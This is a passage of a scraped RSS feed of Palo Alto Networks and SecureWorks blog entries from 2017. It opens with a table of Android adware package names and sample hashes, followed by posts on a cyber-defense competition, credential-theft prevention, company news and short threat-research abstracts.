<td width=""181"">com.g360.funny.camera</td>
<td width=""116"">qiu shixiu</td>
</tr>
<tr>
<td width=""153"">Hot Camera</td>
<td width=""181"">com.group.hotcamera</td>
<td width=""116"">group</td>
</tr>
<tr>
<td width=""153"">Insta Save for Instagram</td>
<td width=""181"">com.inslab.instasaver</td>
<td width=""116"">Li Game Studio Ltd.</td>
</tr>
<tr>
<td width=""153"">Top Instagram Followers</td>
<td width=""181"">com.itop.top100insfollowers</td>
<td width=""116"">Dongli Level Studio</td>
</tr>
<tr>
<td width=""153"">礼物说-礼物和全球好货指南</td>
<td width=""181"">com.liwushuo.gifttalk</td>
<td width=""116"">TieTie Technology</td>
</tr>
<tr>
<td width=""153"">Dual whazaap-alike ogwhastapp</td>
<td width=""181"">com.mob.dualwha</td>
<td width=""116"">qumobile</td>
</tr>
<tr>
<td width=""153"">Wallpaper -recomended by 9apps</td>
<td width=""181"">com.mobile.ninewallpaper1</td>
<td width=""116"">JiangHeng0255ss</td>
</tr>
<tr>
<td width=""153"">Blinking Camera</td>
<td width=""181"">com.op.blinking.camera</p>
<p>com.op.blinkingcamera</td>
<td width=""116"">yan huixin</td>
</tr>
<tr>
<td width=""153"">File master-pro</td>
<td width=""181"">com.tec.file.master</td>
<td width=""116"">yan linqin</td>
</tr>
<tr>
<td width=""153"">file explorer</td>
<td width=""181"">global.fm.filesexplorer</td>
<td width=""116"">tian xiexin</td>
</tr>
<tr>
<td width=""153"">X Camera</td>
<td width=""181"">com.g360.zcamera</td>
<td width=""116"">steve zhao</td>
</tr>
<tr>
<td width=""153"">Dual whats&#8217;app: Multi Account</td>
<td width=""181"">com.multi.account.parallel.dual</td>
<td width=""116"">Dev Tools Studio</td>
</tr>
<tr>
<td width=""153"">Multi Messenger for WhatsWeb</td>
<td width=""181"">com.multi.whatweb</td>
<td width=""116"">What Multi APP</td>
</tr>
<tr>
<td width=""153"">Clean Doctor: Safe &amp; Clean</td>
<td width=""181"">com.nianclub.cleandoctor</td>
<td width=""116"">li lusong</td>
</tr>
<tr>
<td width=""153"">AppLock</td>
<td width=""181"">com.security.multiple.account.applock</td>
<td width=""116"">ScreenLock Apps, Password to Secure Privacy</td>
</tr>
<tr>
<td width=""153"">2Lines for WhatsApp</td>
<td width=""181"">com.tenappsmultiwhat</td>
<td width=""116"">KTeam</td>
</tr>
<tr>
<td width=""153"">Downtuber : video downloader</td>
<td width=""181"">com.yiyue.wuhao</td>
<td width=""116"">li qinkui</td>
</tr>
<tr>
<td width=""153"">Multi Space | Dual App</td>
<td width=""181"">dotapps.multispace</td>
<td width=""116"">Dot Apps Studio</td>
</tr>
<tr>
<td width=""153"">2 Whazzap NoRoot</td>
<td width=""181"">dotapps.multiwhats</td>
<td width=""116"">Dot application</td>
</tr>
<tr>
<td width=""153"">Game Talent &#8211;  Booster &amp; Tuner</td>
<td width=""181"">opt.game.talent</td>
<td width=""116"">Game Talent</td>
</tr>
</tbody>
</table>
<h3>Sample SHA256 Hashes:</h3>
<p>5e5bea52b1f9fcbd78c990cd09057780ebda669a5b632a8dd46ecfcfbfaf6369<br />
24d308a8f2bcabd97b0e7acba8e22821914e464cdb7d0ed61a26400456870edd<br />
6c2a23c0ca361fabc95e2eac3a13641cafe53803c8a4fc32b8a182374ac32ee1<br />
dec71f2464bdfcc7a8fae02e2c103a31b746aa798aeebe1721ccd037156106f4<br />
748dae1604fb0b747bcdeb476aea7d1f6bbec7d7a260613241a9fc3ef1243c66<br />
ee7b82ef97928e0e4d100eb82c37bac6d87ee275cc89ec67c3f8a64fd13561be<br />
5467ebe255bd59912c61aa1b801ea93972672885bfa29c3ee9756342ceb65228<br />
49a9767d1775dd45545ea8fff1250e89fa6fd0c1a694b6583f4e79cd1b14c162<br />
95d12555b71adf13eb40cb78c2f8cfa17aeaaf6f063bcd209a6037463e8fca66<br />
d1916eb07c0a8494df21f8453511df6655fe1bc07efb37b526eae8724665ab91<br />
4e25245dc9c0c8b6cf98e9fcdd6f94dd8e0dad7ad526248999f913682df28531</p>
<p><a href=""http://go.paloaltonetworks.com/ignite2017""><img alt=""ignite17-social-cover-img-facebook-820x340"" class=""alignnone wp-image-25356 size-full"" height=""340"" src=""http://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/03/ignite17-social-cover-img-facebook-820x340.png"" width=""820"" /></a></p>
<p><strong>Ignite ’17 Security Conference: Vancouver, BC June 12–15, 2017</strong></p>
<p>Ignite ’17 Security Conference is a live, four-day conference designed for today’s security professionals. Hear from innovators and experts, gain real-world skills through hands-on sessions and interactive workshops, and find out how breach prevention is changing the security industry. Visit the <a href=""http://www.paloaltonetworksignite.com"">Ignite website</a> for more information on tracks, workshops and marquee sessions.</p>
<p>The post <a href=""http://researchcenter.paloaltonetworks.com/2017/03/unit42-new-trend-android-adware-abusing-android-plugin-frameworks/"" rel=""nofollow"">A New Trend in Android Adware: Abusing Android Plugin Frameworks</a> appeared first on <a href=""http://researchcenter.paloaltonetworks.com"" rel=""nofollow"">Palo Alto Networks Blog</a>.</p>
<img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/PaloAltoNetworks/~4/9oTXazYPMNk"" width=""1"" />",http://feedproxy.google.com/~r/PaloAltoNetworks/~3/9oTXazYPMNk/
Next-Gen Drive: Rob Megennis Wins BIG at St. Petersburg Grand Prix!,"<p></p>
<p><em>Robert Megennis is a 17-year-old racing prodigy. Palo Alto Networks is proud to be a sponsor of Rob’s races for the 2017 Mazda Road to Indy racing season. </em><a href=""http://researchcenter.paloaltonetworks.com/tag/robert-megennis/"">Check out his adventures</a> as part of Team Pelfrey<em> to see why we consider him a true next-generation competitor!</em></p>
<p><strong>Race Weekend #1 at the Grand Prix of St. Petersburg</strong><br />
In the qualification rounds, Rob qualified on pole and set the pace for the entire session. In the next session, he qualified P3 but was moved to P5 after his fastest lap was removed for speeding under a yellow flag.</p>
<p>That flag didn’t deter Rob during race one though. He led the entire race all the way through the last laps and became the first winner born in the 2000s in any IndyCar series with this win.</p>
<p>In race two, Rob passed two cars in the first lap and advanced to P3. With two laps to go, Rob took P2 with a daring pass, before a late braking driver forced Rob into the wall, ending his race.</p>
<p><strong>Keep up with Rob’s journey on social media </strong></p>
<ul>
<li><a href=""https://twitter.com/robertmegennis"">Twitter</a></li>
<li><a href=""https://www.facebook.com/rkmracing/?fref=ts"">Facebook</a></li>
<li><a href=""https://www.instagram.com/robertmegennis/"">Instagram</a></li>
<li><a href=""https://www.youtube.com/user/megennisgopro"">YouTube</a></li>
</ul>
<p><a href=""http://go.paloaltonetworks.com/ignite2017""><img alt=""ignite17-social-cover-img-facebook-820x340"" class=""alignnone wp-image-25356 size-full"" height=""340"" src=""http://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/03/ignite17-social-cover-img-facebook-820x340.png"" width=""820"" /></a></p>
<p><strong>Ignite &#8217;17 Security Conference: Vancouver, BC June 12–15, 2017</strong></p>
<p>Ignite &#8217;17 Security Conference is a live, four-day conference designed for today’s security professionals. Hear from innovators and experts, gain real-world skills through hands-on sessions and interactive workshops, and find out how breach prevention is changing the security industry. Visit the <a href=""http://www.paloaltonetworksignite.com"">Ignite website</a> for more information on tracks, workshops and marquee sessions.</p>
<p>The post <a href=""http://researchcenter.paloaltonetworks.com/2017/03/next-gen-drive-rob-megennis-wins-big-st-petersburg-grand-prix/"" rel=""nofollow"">Next-Gen Drive: Rob Megennis Wins BIG at St. Petersburg Grand Prix!</a> appeared first on <a href=""http://researchcenter.paloaltonetworks.com"" rel=""nofollow"">Palo Alto Networks Blog</a>.</p>
<img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/PaloAltoNetworks/~4/z9epie8pvtU"" width=""1"" />",http://feedproxy.google.com/~r/PaloAltoNetworks/~3/z9epie8pvtU/
Gearing Up for the Collegiate Cyber Defense Competition,"<p>It’s that time of the year when we get to root for our alma mater or favorite college competing in the <a href=""http://www.nationalccdc.org/index.php/competition/about-ccdc/mission"">Collegiate Cyber Defense Competition (CCDC)</a>. This year, Palo Alto Networks is supporting all 10 regional competitions, and the national competition, through the donation of our next-generation firewall, which CCDC teams will use to defend their networks. The Academy Team has set up a Moodle training course for competing teams to learn how to deploy and configure our next-generation firewall to defend their competition networks. Currently, there are more than 800 participants from CCDC teams on our Moodle training site. We also have teamed with the Network Development Group to provide CCDC competing teams with access to our NETLAB+ VM-100 lab pod. Teams are accessing these resources now to prepare for this competition.</p>
<p>Just like the “Sweet 16,” the winning team at each of the regional competitions goes on to compete in the National CCDC, where the winning team is crowned the national champion. This year, the national competition will take place from April 13 to 15, 2017 in the Henry B. Gonzalez Convention Center in San Antonio, Texas.</p>
<p>The national CCDC <a href=""http://www.nationalccdc.org/index.php/competition/about-ccdc/mission"">website</a> includes the mission of the program and a brief description of the competition framework: “CCDC competitions ask student teams to assume administrative and protective duties for an existing “commercial” network – typically a small company with 50+ users, 7 to 10 servers, and such common internet services as a web server, email server and e-commerce site.</p>
<p>Each team begins the competition with an identical set of hardware and software and is scored on its ability to detect and respond to outside threats; maintain the availability of existing services, such as mail servers and web servers; respond to business requests, such as the addition or removal of additional services; and balance security needs against business needs. Throughout the competition an automated scoring engine is used to verify the functionality and availability of each team’s services on a periodic basis, and traffic generators continuously feed simulated user traffic into the competition network.  A volunteer red team provides the “external threat” all internet-based services face and allows the team members to match their defensive skills against live opponents.</p>
<p>When students enter their competition area, they are told they are replacing an IT staff that was fired for negligence and incompetence. As a result, the clients and servers on their networks may be infected with malware and/or configured insecurely, allowing easy access to external attackers. The CCDC competitions last for 20 hours spread over two to three days. The winner of the competition is the team that can keep its services up the longest and scores the highest points for correctly answering the business “injects.”</p>
<p>The competition is organized into color-coded teams. The Blue Team is the student team consisting of five to eight students, two of which can be graduate students; there are multiple such teams in each competition. The Red Team provides the external threat for the Blue Team. Red Team members are usually professional penetration testers. Last year Raphael Mudge, the developer of Armitage for Metasploit, was a Red Team member at the Northeast CCDC. The White Team provides the referees for the competition and generates the business tasks for the Blue Team. At the end of the competition, the White Team determines the winner based on up-time and business inject points. The Orange Team provides customers with whom the Blue Team interacts. The Black Team is responsible for setting up the competition environment for the Blue Team.</p>
<p>Representatives from our Academy and Delivery teams will be at all 10 regional CCDCs in addition to the National CCDC. They will provide technical advice to the competition teams, information about our college internship opportunities, and information about our great academy program. Additionally, Rinki Sethi, our Senior Director of Information Security, will be a member of the White Team at the Midwest CCDC.</p>
<p>Here is the CCDC competition schedule:</p>
<ol>
<li>Rocky Mountain CCDC, March 10–11, Regis University, Denver, Colo.
<ul>
<li>Regis University</li>
<li>Colorado State University</li>
<li>Brigham Young University</li>
<li>Utah Valley University</li>
<li>Southern Utah University</li>
<li>LDS Business College</li>
<li>Front Range Community College</li>
<li>USAF Academy</li>
<li>University of New Mexico</li>
<li>University of Nebraska/ Kearney</li>
</ul>
</li>
</ol>
<ol start=""2"">
<li>Northeast CCDC, March 17–19, RIT Rochester, N.Y.
<ul>
<li>Champlain College</li>
<li>Harvard University</li>
<li>Northeastern University</li>
<li>Rochester Institute of Technology</li>
<li>Syracuse University</li>
<li>University at Buffalo</li>
<li>University of Maine</li>
<li>University of New Hampshire</li>
<li>Utica College</li>
<li>Westchester Community College</li>
</ul>
</li>
</ol>
<ol start=""3"">
<li>Midwest CCDC, March 17–18, Moraine Valley Community College, Palos Hills, Ill.
<ul>
<li>Participating teams to be announced.</li>
</ul>
</li>
</ol>
<ol start=""4"">
<li>Southwest CCDC, March 17–19, University of Tulsa, Tulsa, Okla.
<ul>
<li>Participating teams to be announced.</li>
</ul>
</li>
</ol>
<ol start=""5"">
<li>Pacific Rim CCDC, March 24–26, Highline College, Des Moines, Wash.
<ul>
<li>Central Washington University</li>
<li>Clover Park Technical College</li>
<li>Columbia Basin College</li>
<li>Green River College</li>
<li>Lewis &amp; Clark College</li>
<li>Peninsula College</li>
<li>Spokane Falls Community College</li>
<li>The Evergreen State College</li>
<li>University of Idaho</li>
<li>University of Washington, Bothell</li>
<li>University of Washington, Seattle</li>
<li>University of Washington, Tacoma</li>
<li>Western Washington University</li>
<li>Whatcom Community College</li>
</ul>
</li>
</ol>
<ol start=""6"">
<li>Western Regional CCDC, March 24–26, Cal Poly Pomona, Pomona, Calif.
<ul>
<li>Arizona State University</li>
<li>UC Berkley</li>
<li>Cal Poly Pomona</li>
<li>CSU Northridge</li>
<li>CSU San Bernardino</li>
<li>Stanford University</li>
<li>UC Riverside</li>
<li>University of Advancing Technology</li>
</ul>
</li>
</ol>
<ol start=""7"">
<li>At Large CCDC, March 24–26, Online
<ul>
<li>Participating teams to be announced.</li>
</ul>
</li>
</ol>
<ol start=""8"">
<li>Mid Atlantic CCDC, March 30–April 1, John Hopkins University, Laurel, Md.
<ul>
<li>Participating teams to be announced</li>
</ul>
</li>
</ol>
<ol start=""9"">
<li>North Central CCDC, March 30–31 Dakota State University, Madison, S.D.
<ul>
<li>Participating teams to be announced.</li>
</ul>
</li>
</ol>
<ol start=""10"">
<li>Southeast CCDC, April 5–6 Kennesaw State University, Kennesaw, Ga.
<ul>
<li>Participating teams to be announced.</li>
</ul>
</li>
</ol>
<ol start=""11"">
<li>National CCDC, April 13–15, Henry B. Gonzalez Convention Center, San Antonio, Texas
<ul>
<li>The winners from the 10 regional CCDCs.</li>
</ul>
</li>
</ol>
<p><a href=""http://go.paloaltonetworks.com/ignite2017""><img alt=""ignite17-social-cover-img-facebook-820x340"" class=""alignnone wp-image-25356 size-full"" height=""340"" src=""http://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/03/ignite17-social-cover-img-facebook-820x340.png"" width=""820"" /></a></p>
<p><strong>Ignite &#8217;17 Security Conference: Vancouver, BC June 12–15, 2017</strong></p>
<p>Ignite &#8217;17 Security Conference is a live, four-day conference designed for today’s security professionals. Hear from innovators and experts, gain real-world skills through hands-on sessions and interactive workshops, and find out how breach prevention is changing the security industry. Visit the <a href=""http://www.paloaltonetworksignite.com"">Ignite website</a> for more information on tracks, workshops and marquee sessions.</p>
<p>The post <a href=""http://researchcenter.paloaltonetworks.com/2017/03/gearing-collegiate-cyber-defense-competition/"" rel=""nofollow"">Gearing Up for the Collegiate Cyber Defense Competition</a> appeared first on <a href=""http://researchcenter.paloaltonetworks.com"" rel=""nofollow"">Palo Alto Networks Blog</a>.</p>
<img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/PaloAltoNetworks/~4/_9W3iItvDNY"" width=""1"" />",http://feedproxy.google.com/~r/PaloAltoNetworks/~3/_9W3iItvDNY/
"New White Paper on Preventing Credential Phishing, Theft and Abuse","<p>Today we’re releasing a new Unit 42 white paper titled “<a href=""https://www.paloaltonetworks.com/content/pan/en_US/resources/research/unit-42-credential-based-attacks.html"">Credential-Based Attacks: Exposing the Ecosystem and Motives Behind Credential Phishing, Theft and Abuse.</a>” In this paper, we look at the problem of credential theft by exploring how it happens, what attackers do with credentials once they’ve stolen them, and what you can do to help prevent credential-based attacks.</p>
<p>Credentials and authentication have become synonymous, with valid credentials allowing access to sensitive resources. Adversaries are increasingly stealing and using credentials as part of their playbooks; impersonating legitimate users to access a company’s most sensitive information, erase data on servers, and reconfigure them so that they can’t boot; and undertake other malicious activities. Stolen credentials underpin some of the most critical and damaging attacks out there; both <a href=""http://researchcenter.paloaltonetworks.com/tag/shamoon-2/"">Shamoon 2</a> and the <a href=""http://researchcenter.paloaltonetworks.com/tag/sofacy/"">Sofacy</a> threat actor group, for example, have made detailed use of credential theft.</p>
<p>Credential theft today can happen in many ways, but the most notable are through credential phishing and the use of malware like keyloggers (both staples of the Sofacy group), as well as password reuse. The impact of a successful credential theft is, ultimately, access and authorization. Attackers will use credential theft for remote access to an organization, to access cloud-based resources (which may have weaker credential protections than network-based resources), or to move laterally within an organization once they’ve gained entry. The most sophisticated attacks can – and do – blend these actions together, sometimes using multiple stolen credentials to penetrate networks, move laterally within them, elevate privileges, and then access and steal data.</p>
<p>Prevention of credential theft is too often overlooked. Organizations should continue with user education to help users better spot and not fall for phishing and spam attacks. You and your employees can also use password managers to make unique, complex passwords for each site not just a goal but a reality. Technology is also catching up; recent advances in two-factor/multi-factor authentication (2FA/MFA) and one-time passwords (OTP) represent the best long-term approaches to preventing credential theft. (Our newest release, <a href=""https://www.paloaltonetworks.com/products/innovations/credential-theft-prevention"">PAN-OS 8.0</a>, also includes protections to significantly limit or eliminate password reuse.)</p>
<p><a href=""https://www.paloaltonetworks.com/content/pan/en_US/resources/research/unit-42-credential-based-attacks.html""><strong>Get your copy of our white paper here.</strong></a></p>
<p><a href=""http://go.paloaltonetworks.com/ignite2017""><img alt=""ignite17-social-cover-img-facebook-820x340"" class=""alignnone wp-image-25356 size-full"" height=""340"" src=""http://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/03/ignite17-social-cover-img-facebook-820x340.png"" width=""820"" /></a></p>
<p><strong>Ignite &#8217;17 Security Conference: Vancouver, BC June 12–15, 2017</strong></p>
<p>Ignite &#8217;17 Security Conference is a live, four-day conference designed for today’s security professionals. Hear from innovators and experts, gain real-world skills through hands-on sessions and interactive workshops, and find out how breach prevention is changing the security industry. Visit the <a href=""http://www.paloaltonetworksignite.com"">Ignite website</a> for more information on tracks, workshops and marquee sessions.</p>
<p>The post <a href=""http://researchcenter.paloaltonetworks.com/2017/03/unit42-new-white-paper-preventing-credential-phishing-theft-abuse/"" rel=""nofollow"">New White Paper on Preventing Credential Phishing, Theft and Abuse</a> appeared first on <a href=""http://researchcenter.paloaltonetworks.com"" rel=""nofollow"">Palo Alto Networks Blog</a>.</p>
<img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/PaloAltoNetworks/~4/sc01vuu1zvQ"" width=""1"" />",http://feedproxy.google.com/~r/PaloAltoNetworks/~3/sc01vuu1zvQ/
The 2017 Cybersecurity Canon Bracket Challenge: Vote Now for Round 2,"<p>Voting is now open for this year’s inductees into <a href=""https://www.paloaltonetworks.com/threat-research/cybercanon.html"">The Cybersecurity Canon</a>. In true March Madness style, we’re bringing back last year’s popular bracket-style voting competition to help us decide which cybersecurity books deserve to be canonized.</p>
<p><strong>Here’s how it works:</strong></p>
<ul>
<li>The polls will run for five weeks starting Monday, March 13 and continuing through Friday, April 14.</li>
<li>A new bracket will be posted on the <a href=""http://researchcenter.paloaltonetworks.com/tag/cybersecurity-canon/"">Palo Alto Networks blog</a> every Monday. Voting will remain open through Friday of the same week. <em>Come back each week to cast your vote on the new brackets. </em></li>
<li>Each week the winners move on to the next round until only one book is left.</li>
<li>The winner will be inducted into The Cybersecurity Canon on Thursday, May 4, during the 2017 Awards Gala in Washington, D.C.</li>
</ul>
<p>We have 32 nominated books this year. <a href=""https://paloaltonetworks.wufoo.com/forms/r5sskka0y2x8tn/"">Vote for your Cybersecurity Canon champion now!</a></p>
<div id=""wufoo-szpweq81op50d8"">Fill out my <a href=""https://paloaltonetworks.wufoo.com/forms/szpweq81op50d8"">online form</a>.</div>
<p></p>
<p><a href=""http://go.paloaltonetworks.com/ignite2017""><img alt=""ignite17-social-cover-img-facebook-820x340"" class=""alignnone wp-image-25356 size-full"" height=""340"" src=""http://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/03/ignite17-social-cover-img-facebook-820x340.png"" width=""820"" /></a></p>
<p><strong>Ignite &#8217;17 Security Conference: Vancouver, BC June 12–15, 2017</strong></p>
<p>Ignite &#8217;17 Security Conference is a live, four-day conference designed for today’s security professionals. Hear from innovators and experts, gain real-world skills through hands-on sessions and interactive workshops, and find out how breach prevention is changing the security industry. Visit the <a href=""http://www.paloaltonetworksignite.com"">Ignite website</a> for more information on tracks, workshops and marquee sessions.</p>
<p>The post <a href=""http://researchcenter.paloaltonetworks.com/2017/03/2017-cybersecurity-canon-bracket-challenge-vote-now-round-2/"" rel=""nofollow"">The 2017 Cybersecurity Canon Bracket Challenge: Vote Now for Round 2</a> appeared first on <a href=""http://researchcenter.paloaltonetworks.com"" rel=""nofollow"">Palo Alto Networks Blog</a>.</p>
<img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/PaloAltoNetworks/~4/22KEM7eUC94"" width=""1"" />",http://feedproxy.google.com/~r/PaloAltoNetworks/~3/22KEM7eUC94/
"Palo Alto Networks News of the Week – March 18, 2017","<p>Did you miss any of this week’s Palo Alto Networks action? Don’t worry &#8212; we’ve rounded up our top news and views right here:</p>
<ul>
<li>The Unit 42 Threat Intelligence team shared new research:
<ul>
<li><a href=""http://researchcenter.paloaltonetworks.com/2017/03/unit42-regional-malware-trends-latin-america-july-december-2016/"">Regional Malware Trends in Latin America: July – December 2016</a></li>
<li><a href=""http://researchcenter.paloaltonetworks.com/2017/03/unit42-nexuslogger-new-cloud-based-keylogger-enters-market/"">NexusLogger: A New Cloud-based Keylogger Enters the Market</a></li>
<li><a href=""http://researchcenter.paloaltonetworks.com/2017/03/unit42-palo-alto-networks-unit-42-vulnerability-research-march-2017-disclosures/"">Palo Alto Networks Researcher Discovers Three New Adobe Falsh Vulnerabilities </a></li>
</ul>
</li>
<li>We reviewed the <a href=""http://researchcenter.paloaltonetworks.com/2017/03/pan-os-8-0-announcing-new-expanded-partner-integrations/"">new and expanded partner integrations for PAN-OS 8.0</a>.</li>
<li>Women in cybersecurity: Rinki Sethi, Senior Director of Security Operations and Strategy at Palo Alto Networks, <a href=""http://researchcenter.paloaltonetworks.com/2017/03/women-cybersecurity-journey-infosec/"">shared her journey to a career in InfoSec</a>.</li>
<li>Updates to Palo Alto Networks Aperture <a href=""http://researchcenter.paloaltonetworks.com/2017/03/aperture-updates-extend-saas-security-europe-help-meet-data-privacy-needs/"">extend SaaS security to help meet European data privacy needs</a>.</li>
<li>Don’t just listen – act. Palo Alto Networks EMEA CSO Greg Day <a href=""http://researchcenter.paloaltonetworks.com/2017/03/cso-lets-not-leave-new-uk-nca-ncsc-cyberthreat-report-shelf/"">weighed in on UK’s new National Crime Agency and National Cyber Security Center cyberthreat report</a></li>
<li>Securing the government: Pamela Warren shared the <a href=""http://researchcenter.paloaltonetworks.com/2017/03/gov-securing-government-heres-learn-2016/"">cybersecurity lessons we should learn from 2016</a>.</li>
<li>We shared how <a href=""http://researchcenter.paloaltonetworks.com/2017/03/traps-can-can-prevent-ranran-ransomware/"">Traps can prevent ransomware</a> such as RanRan.</li>
<li>The <a href=""http://researchcenter.paloaltonetworks.com/2017/03/2017-cybersecurity-canon-bracket-challenge-vote-now-round-1/"">Cybersecurity Canon Bracket Challenge is on</a>! Vote now for round one.</li>
</ul>
<p>Take a look at <a href=""http://events.paloaltonetworks.com/"">upcoming events</a> around the world that you should know about. Don’t forget to register for our <a href=""https://signup.paloaltonetworks.com/ehome/event-calendar"">events calendar</a>!</p>
<p><a href=""https://signup.paloaltonetworks.com/ehome/229719"">Virtual Ultimate Test Drive NGFW Mar 20th, 2017</a></p>
<ul>
<li>March 20, 2017</li>
<li>Online</li>
</ul>
<p><a href=""https://signup.paloaltonetworks.com/ehome/237196"">Ultimate Test Drive – Chennai</a></p>
<ul>
<li>March 21, 2017</li>
<li>Chennai, India</li>
</ul>
<p><a href=""https://signup.paloaltonetworks.com/ehome/233261"">Secure Any Cloud</a></p>
<ul>
<li>March 21, 2017</li>
<li>Houten, The Netherlands</li>
</ul>
<p><a href=""https://signup.paloaltonetworks.com/ehome/234828"">Exploits &amp; Malware Revealed</a></p>
<ul>
<li>March 21, 2017</li>
<li>San Diego, CA</li>
</ul>
<p><a href=""http://go.paloaltonetworks.com/FinServ032217"">Preventing Cyberattacks in Financial Services with Advanced Endpoint Protection</a></p>
<ul>
<li>March 22, 2017</li>
<li>Online</li>
</ul>
<p><a href=""https://signup.paloaltonetworks.com/ehome/224663"">NGFW: Next Generation Firewall Live Demo</a></p>
<ul>
<li>March 22, 2017</li>
<li>Online</li>
</ul>
<p><a href=""https://signup.paloaltonetworks.com/ehome/225027"">How to stand out from the crowd and make more money with Palo Alto Networks?</a></p>
<ul>
<li>March 22, 2017</li>
<li>London, UK</li>
</ul>
<p><a href=""https://signup.paloaltonetworks.com/ehome/237194"">Ultimate Test Drive – Vadodara</a></p>
<ul>
<li>March 22, 2017</li>
<li>Vadodara, India</li>
</ul>
<p><a href=""https://signup.paloaltonetworks.com/ehome/229737"">Virtual Ultimate Test Drive Threat Prevention</a></p>
<ul>
<li>March 22, 2017</li>
<li>Online</li>
</ul>
<p><a href=""https://signup.paloaltonetworks.com/ehome/225748"">Ultimate Test Drive: Advanced Endpoint Protection Budapest</a></p>
<ul>
<li>March 22, 2017</li>
<li>Budapest, Hungary</li>
</ul>
<p><a href=""https://signup.paloaltonetworks.com/ehome/237190"">Ultimate Test Drive – Surat</a></p>
<ul>
<li>March 22, 2017</li>
<li>Surat, India</li>
</ul>
<p><a href=""https://signup.paloaltonetworks.com/ehome/232332"">Cybersecurity Summit – Mumbai</a></p>
<ul>
<li>March 23, 2017</li>
<li>Mumbai, India</li>
</ul>
<p><a href=""https://signup.paloaltonetworks.com/ehome/237520"">Partner Training Webinar: NEW Pan-OS 8.0 and NEW Products</a></p>
<ul>
<li>March 23, 2017</li>
<li>Online</li>
</ul>
<p><a href=""http://go.paloaltonetworks.com/ignite2017""><img alt=""ignite17-social-cover-img-facebook-820x340"" class=""alignnone wp-image-25356 size-full"" height=""340"" src=""http://researchcenter.paloaltonetworks.com/wp-content/uploads/2017/03/ignite17-social-cover-img-facebook-820x340.png"" width=""820"" /></a></p>
<p><strong>Ignite &#8217;17 Security Conference: Vancouver, BC June 12–15, 2017</strong></p>
<p>Ignite &#8217;17 Security Conference is a live, four-day conference designed for today’s security professionals. Hear from innovators and experts, gain real-world skills through hands-on sessions and interactive workshops, and find out how breach prevention is changing the security industry. Visit the <a href=""http://www.paloaltonetworksignite.com"">Ignite website</a> for more information on tracks, workshops and marquee sessions.</p>
<p>The post <a href=""http://researchcenter.paloaltonetworks.com/2017/03/palo-alto-networks-news-week-march-18-2017/"" rel=""nofollow"">Palo Alto Networks News of the Week – March 18, 2017</a> appeared first on <a href=""http://researchcenter.paloaltonetworks.com"" rel=""nofollow"">Palo Alto Networks Blog</a>.</p>
<img alt="""" height=""1"" src=""http://feeds.feedburner.com/~r/PaloAltoNetworks/~4/gLWmtGn3y8M"" width=""1"" />",http://feedproxy.google.com/~r/PaloAltoNetworks/~3/gLWmtGn3y8M/
Wire Wire: A West African Cyber Threat,"Type: Threat Analysis<a href=""https://www.secureworks.com/research/wire-wire-a-west-african-cyber-threat""><img src=""https://www.secureworks.com/~/media/Images/Insights/Things/052 coder-lapto/things_0052_coder-laptop_360x190.ashx"" /></a><br /><h3>Category:</h3><span>CTU Research</span><br /><br />An increasing amount of wire-wire activity uses business email compromise to steal money from victims, but there are ways to mitigate the threat.",https://www.secureworks.com/research/wire-wire-a-west-african-cyber-threat
Threat Group-4127 Targets Google Accounts,"Type: Threat Analysis<a href=""https://www.secureworks.com/research/threat-group-4127-targets-google-accounts""><img src=""https://www.secureworks.com/~/media/Images/Insights/Abstracts/043 molecule structure/abstracts_0043_molecule-structure_360x190.ashx"" /></a><br /><h3>Category:</h3><span>CTU Research</span><br /><br />",https://www.secureworks.com/research/threat-group-4127-targets-google-accounts
Threat Group-4127 Targets Hillary Clinton Presidential Campaign,"Type: Threat Analysis<a href=""https://www.secureworks.com/research/threat-group-4127-targets-hillary-clinton-presidential-campaign""><img src=""https://www.secureworks.com/~/media/Images/Insights/Abstracts/044 LED Path/abstracts_0044_led-path_360x190.ashx"" /></a><br /><h3>Category:</h3><span>CTU Research</span><br /><br />Learn how SecureWorks CTU researchers tracked the activities of a Russian-based threat group targeting the Hillary Clinton Presidential Campaign.",https://www.secureworks.com/research/threat-group-4127-targets-hillary-clinton-presidential-campaign
Banking Botnets: The Battle Continues,"Type: Threat Analysis<a href=""https://www.secureworks.com/research/banking-botnets-the-battle-continues""><img src=""https://www.secureworks.com/~/media/Images/Insights/Abstracts/040 cybersecurity-report/abstracts_0040_cybersecurity-report_360x190.ashx"" /></a><br /><h3>Category:</h3><span>CTU Research</span><br /><br />Learn how banking botnets evolved in 2015, as our CTU analyzes new banking botnet targets, attack patterns, and new malware families.",https://www.secureworks.com/research/banking-botnets-the-battle-continues
Dridex (Bugat v5) Botnet Takeover Operation,"Type: Threat Analysis<a href=""https://www.secureworks.com/research/dridex-bugat-v5-botnet-takeover-operation""><img src=""https://www.secureworks.com/~/media/Images/Insights/Things/006 dell-switches/things_0006_dell-switches_360x190.ashx"" /></a><br /><h3>Category:</h3><span>CTU Research</span><br /><br />The CTU research team collaborated with the UK NCA, the U.S. FBI, and the Shadowserver Foundation to take over the Dridex Bugat v5 banking trojan.",https://www.secureworks.com/research/dridex-bugat-v5-botnet-takeover-operation
Hacker Group Creates Network of Fake LinkedIn Profiles,"Type: Threat Analysis<a href=""https://www.secureworks.com/research/suspected-iran-based-hacker-group-creates-network-of-fake-linkedin-profiles""><img src=""https://www.secureworks.com/~/media/Images/Insights/Things/001 dell-laptop-vancouver-cafe/things_0001_dell-laptop-vancouver-cafe_360x190.ashx"" /></a><br /><h3>Category:</h3><span>CTU Research</span><br /><br />While tracking a suspected Iran-based Threat Group-2889, SecureWorks CTU researchers uncovered a network of fake LinkedIn profiles.",https://www.secureworks.com/research/suspected-iran-based-hacker-group-creates-network-of-fake-linkedin-profiles
